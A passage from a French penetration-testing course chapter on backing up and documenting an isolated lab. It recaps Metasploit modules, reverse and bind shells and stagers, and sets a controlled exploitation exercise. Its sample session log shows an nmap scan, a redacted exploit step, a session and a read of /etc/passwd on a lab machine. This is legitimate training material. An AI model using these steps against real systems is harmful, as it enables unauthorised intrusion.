+Un laboratoire n'a de valeur que s'il se reconstruit. Les machines se cassent, les disques se remplissent, les sauvegardes automatiques des postes modernes suppriment parfois des fichiers oubliés, et un ordinateur portable volé emporte avec lui des semaines de travail si rien n'a été copié ailleurs. Nous distinguons donc deux opérations qui se complètent sans se remplacer : la sauvegarde, qui protège contre la perte, et la documentation, qui protège contre l'oubli.
+
+La sauvegarde du lab suit une règle simple, adaptée de la règle trois-deux-un. Trois copies des données utiles, sur deux supports différents, dont une copie déconnectée du laboratoire. Les données utiles sont précisément définies : les disques virtuels des machines de base, le dossier lab-off3 contenant les notes, les scripts de création, les fichiers de ressources de la console et les sorties de scan, ainsi que les captures de trafic et les journaux d'exercice. Les snapshots, eux, ne comptent pas comme copie, puisqu'ils vivent sur le même disque que les machines.
+
+L'export d'une machine vers un fichier unique est l'opération la plus commode, car elle produit un artefact transportable, vérifiable par empreinte et importable sur un autre poste. La commande ci-dessous illustre la séquence complète : export, calcul d'empreinte, archivage du dossier de notes, puis vérification de l'ensemble. Prévoyez d'y revenir après chaque séance importante plutôt qu'à la fin du chapitre, car c'est après une séance réussie que la perte est la plus coûteuse.
+
+```bash
+# sauvegarde du lab vers un support externe /lab-backup
+mkdir -p /lab-backup/2026-10-09
+VBoxManage export "linux-target1" -o /lab-backup/2026-10-09/linux-target1.ova
+VBoxManage export "win10-lab"     -o /lab-backup/2026-10-09/win10-lab.ova
+tar -C /vms -czf /lab-backup/2026-10-09/notes-lab-off3.tar.gz lab-off3
+sha256sum /lab-backup/2026-10-09/* > /lab-backup/2026-10-09/empreintes.sha256
+# verifier que la copie est lisible avant de considerer la sauvegarde comme faite
+sha256sum -c /lab-backup/2026-10-09/empreintes.sha256
+```
+
+Une sauvegarde qui n'a jamais été restaurée n'est pas une sauvegarde, c'est un espoir. Prévoyez donc une restauration d'essai périodique : importez le fichier exporté dans un dossier temporaire, démarrez la machine, vérifiez qu'elle démarre, que son adresse réseau est correcte et que le service d'exercice répond. Cet essai vous apprendra aussi les défauts de votre procédure : une machine exportée sans son disque de configuration, une copie tronquée par un espace insuffisant, ou une archive dont l'empreinte n'a jamais été comparée.
+
+```text
+# carnet de seance — format que nous utiliserons tout au long du parcours
+Date et heure      : 2026-10-09, 14 h 05 - 15 h 20
+Objectif           : obtenir une session sur linux-target1 puis stabiliser le shell
+Perimetre          : 192.168.56.0/24, machines .10 .20 .30
+Etat de depart     : snapshot pret-exercice, horloge synchronisee
+Etapes realisees   : 1) db_nmap -sV -sC -O 192.168.56.20
+                     2) use exploit/... puis set RHOSTS et LHOST
+                     3) exploit -j, session 1 ouverte a 14 h 22
+                     4) migration du processus, session conservee 12 minutes
+Resultat obtenu   : session commande stable, lecture de /etc/passwd reussie
+Echecs notes      : tentative sur le port X refusee, cause : port deja occupe
+Artefacts          : capture.pcap, sortie-scan.txt, ressources-setup.rc
+Point de reprise   : snapshot pret-exercice restaure a 15 h 20
+Verdict            : objectif atteint, reproductible, rien hors perimetre
+```
+
+La documentation est ce qui rend une séance réutilisable. Trois formats se valent, à condition d'être tenus : un fichier texte par séance, un fichier de ressources exécutable par la console pour rejouer la configuration, et des sorties de scan archivées sous un nom daté. Écrivez pendant l'action et non après, car la mémoire reconstitue toujours une version plus favorable de ce qui s'est passé, et parce qu'un carnet rédigé après coup ne contient jamais les échecs, qui sont pourtant la partie la plus instructive.
+
+Le classement compte autant que le contenu. Une convention de nommage unique, composée de la date, de l'objectif et de la machine, permet de retrouver un élément dans six mois sans l'ouvrir : 2026-10-09_enum-smb_linux-target1.pcap. Appliquez-la aux captures, aux scans, aux notes et aux exports. Vous constaterez rapidement que la difficulté n'est pas de produire de la documentation, mais de la retrouver au moment exact où vous en avez besoin, généralement pendant une démonstration devant d'autres personnes.
+
+```table
+| Élément à conserver | Format | Fréquence | Vérification |
+| --- | --- | --- | --- |
+| Machines de base | Fichier exporté unique | Après chaque configuration importante | Restauration d'essai trimestrielle |
+| Notes et plan d'adressage | Fichier texte daté | À chaque séance | Lecture par un tiers |
+| Configuration de console | Fichier de ressources exécutable | Après chaque exploitation réussie | Rejeu sur l'état propre |
+| Captures et sorties de scan | Fichier brut, nommé à la date | À chaque séance | Empreinte calculée à l'archivage |
+| Sauvegarde complète | Copie déconnectée | Mensuelle et avant chaque séance longue | Comparaison d'empreintes |
+```
+
+Le contrôle ultime de la qualité d'un lab est la reconstruction intégrale. Une fois par chapitre, effacez les machines de travail, gardez uniquement les scripts de création, les exports de base et les notes, puis reconstruisez l'ensemble à partir de ce matériel. Si l'opération réussit en moins d'une heure, votre laboratoire est un patrimoine ; si elle échoue, c'est que votre travail reposait sur des états invisibles jamais documentés, et vous aurez découvert ce point dans des conditions sans conséquence plutôt que la veille d'une démonstration. Cette reconstruction est aussi le meilleur exercice de synthèse du chapitre, puisqu'elle vous oblige à relire tout ce que vous avez fait, dans l'ordre, avec les commandes exactes.
+
+## À retenir
+
+Le laboratoire est le fondement de tout le chapitre, et trois de ses propriétés commandent la suite : il est isolé, il est reproductible et il est réversible. Isolé signifie que seule l'interface host-only est active pendant les exercices, que le mode pont n'est jamais utilisé et que le contrôle d'isolation est relancé avant chaque séance. Reproduisible signifie que les adresses sont fixes, les noms sont normalisés et les états de base sont figés en snapshots nommés. Réversible signifie qu'un retour arrière est possible à tout instant, après documentation, de sorte qu'une erreur reste un événement pédagogique et non un dommage.
+
+Côté exploitation, retenez la structure du framework et la distinction qui la traverse. La console repose sur un vocabulaire court : search, info, use, show options, set, show payloads, exploit, sessions et jobs, complétés par workspace et db_nmap pour la mémoire de campagne. Les modules exploit visent l'ouverture d'une session et livrent une charge utile ; les modules auxiliary collectent de l'information et n'en livrent pas ; les modules post s'exécutent seulement après l'accès initial ; les modules payload sont les charges utiles elles-mêmes. Un rang élevé indique un mécanisme fiable, pas une gravité élevée.
+
+La mécanique des sessions tient en quelques faits qu'il ne faut jamais perdre de vue. Un reverse shell est initié par la cible, un bind shell par la machine d'attaque, et le choix se décide d'après les filtrages. Un stager est un amorçage qui récupère la suite, et charge utile et gestionnaire doivent être configurés de façon strictement identique : même identifiant, même adresse, même port. Le choix d'une couche échange discrétion contre simplicité et robustesse, et il se prend après avoir vérifié le chemin réseau réel par une capture.
+
+Enfin, la valeur d'un travail se mesure à sa traçabilité. Chaque constat distingue ce qui est établi, ce qui est supposé et ce qui n'a pas été vérifié, avec son niveau de confiance et ses prérequis. Chaque séance laisse un carnet, des artefacts nommés à la date et un point de reprise. Chaque action reste à l'intérieur d'un périmètre écrit, sur des machines qui vous appartiennent ou qui vous ont été confiées par écrit, avec un travail mené à deux pour les gestes sensibles. C'est cette discipline qui transforme une démonstration technique en compétence professionnelle.
+
+## Erreurs fréquentes
+
+L'erreur la plus coûteuse est de commencer l'exercice sans avoir vérifié le périmètre. Une adresse laissée par défaut, un réseau en mode pont, une carte NAT encore active ou une plage de scan recopiée depuis un autre exercice suffisent à faire sortir le trafic du laboratoire. Le symptôme est discret : les commandes semblent fonctionner, mais les résultats ne correspondent pas à vos machines. Le remède est un rituel de trois minutes, exécuté dans l'ordre : adresses, routes, test de sortie, puis contrôle du plan d'adressage écrit.
+
+La deuxième erreur consiste à configurer l'écouteur et la charge utile séparément, sans les confronter. L'adresse LHOST reste celle d'un réseau précédent, le port est encore occupé par un job oublié, ou le gestionnaire attend une charge unique alors que le module envoie un stager. Tous ces cas produisent un silence parfait, sans message d'erreur, ce qui invite à accuser l'outil. La contre-mesure tient en un réflexe : relire show options et jobs avant chaque lancement, et effacer les variables globales laissées par la séance précédente.
+
+La troisième erreur est de prendre la session pour un résultat. Une session qui s'ouvre et se referme immédiatement, portée par un processus éphémère, ne prouve qu'une chose : que le déclenchement a fonctionné une fraction de seconde. De même, une commande exécutée dans un shell brut, avec un affichage illisible et un environnement inadapté, ne permet pas de conclure grand-chose. Migrez la session, alignez le terminal, puis jugez.
+
+La quatrième erreur est de généraliser depuis le laboratoire. Les machines du lab sont non corrigées, sans outil de détection et en configuration par défaut : leur compromission rapide est normale et n'annonce rien du comportement d'un système réel. Écrivez toujours, à côté de votre réussite, les conditions qui l'ont rendue possible et ce que vous n'avez pas testé.
+
+La cinquième erreur est négliger l'archivage. Des snapshots qui s'accumulent sur un disque presque plein, des notes rédigées après coup, des captures sans date et des sauvegardes jamais restaurées produisent un lab qui semble complet et qui ne se reconstruit pas. Fixez une fréquence, nommez à la date, vérifiez par empreinte et testez une restauration, sinon vous stockez de l'espoir, pas des données.
+
+## Pour aller plus loin
+
+Pour approfondir, commencez par la documentation officielle du framework que vous utilisez : la description des types de modules, la référence des options de la console et le guide des gestionnaires de session constituent la base la plus fiable, car elle est maintenue avec le code lui-même. Lisez-la en anglais sans détour : la terminologie du métier y est fixée, et vous aurez besoin de ces mots exacts pour lire des rapports, des analyses de sécurité et des discussions entre praticiens.
+
+Ensuite, travaillez la documentation des projets open source de laboratoire, qui publient des machines volontairement vulnérables et, surtout, des scénarios d'utilisation. Observer la manière dont un projet décrit ses prérequis, ses états de départ et ses procédures de remise à zéro vous apprendra plus sur la conduite d'un lab que n'importe quel tutoriel. Comparez cette rigueur à la vôtre : si vous ne pouvez pas remettre votre lab dans un état connu en trois commandes, votre documentation est incomplète.
+
+Troisièmement, consacrez du temps à la lecture des guides de divulgation responsable et aux chartes d'éthique publiées par les communautés de sécurité. Ce sont des textes courts, très pratiques, qui décrivent ce qu'il faut faire quand on découvre un défaut, à qui écrire, sous quel délai et avec quelles réserves. Ils vous seront utiles bien avant que vous ne les ayez besoin, et ils vous donneront le vocabulaire exact pour poser vos limites dans un contexte professionnel.
+
+Quatrièmement, entraînez-vous à rédiger. Reprenez vos trois dernières séances du lab et réécrivez-les en un constat d'une page comportant quatre blocs : ce qui a été fait, ce qui a été établi, ce qui reste supposé, et ce qui reste à vérifier. Faites relire par quelqu'un qui n'a pas suivi la manipulation : ses questions vous montreront précisément les endroits où votre pensée était restée implicite.
+
+Enfin, explorez les aspects que ce chapitre n'a fait qu'effleurer : la simulation de filtrages pour tester vos propres configurations, la mise en place d'un routeur virtuel pour découper le lab en segments, et l'automatisation complète de la création du laboratoire par des scripts, de sorte qu'une machine puisse être reconstruite à l'identique sur un autre poste. Chacune de ces pistes renforce les trois propriétés essentielles du lab, et toutes s'appuient sur la même discipline : écrire avant d'agir, vérifier avant de conclure, archiver avant de recommencer.
+
+## Et maintenant : passez à l'exercice pratique
+
+Vous avez maintenant l'essentiel : un laboratoire isolé, une maîtrise de base de la console, la distinction nette entre familles de modules, la compréhension des mécanismes de shell et de livraison, et les règles qui encadrent la restitution d'un résultat. L'exercice qui suit va les réunir en une séance unique, avec des livrables précis à déposer dans votre dossier lab-off3.
+
+L'objectif est de démontrer, du début à la fin, une exploitation contrôlée dans votre propre lab, puis d'en rendre compte honnêtement. Vous partez d'un état pret-exercice restauré et horloge synchronisée. Vous reconstruisez le plan d'adressage, vous exécutez une reconnaissance en base depuis la console, vous sélectionnez un module d'exploitation en justifiant votre choix par les informations relevées, vous obtenez une session, vous la stabilisez et vous exécutez au moins deux actions de confirmation. Vous arrêtez là : aucune modification persistante, aucune donnée réelle, aucune cible hors périmètre.
+
+Les livrables sont au nombre de quatre. Le premier est le carnet de séance complet, au format présenté dans la leçon, avec les étapes, les commandes exactes, les échecs et le verdict. Le second est un fichier de ressources exécutable qui rejoue votre configuration de console depuis l'état propre. Le troisième est le constat d'évaluation en une page, structuré en constat, démonstration, prérequis, non établi, confiance et recommandation. Le quatrième est une sauvegarde datée, avec ses empreintes, et une restauration d'essai documentée.
+
+Vous vous auto-évaluerez sur cinq points : le périmètre est-il resté strictement dans le réseau host-only, la documentation permet-elle à un tiers de rejouer l'ensemble, les limites de votre démonstration sont-elles écrites explicitement, la session est-elle restée stable le temps des deux actions de confirmation, et le lab est-il revenu à l'état de base après archivage ? Si vous répondez oui à ces cinq questions, vous avez atteint l'objectif du chapitre : vous ne savez pas seulement obtenir un accès, vous savez en rendre compte, ce qui est la compétence réellement demandée.
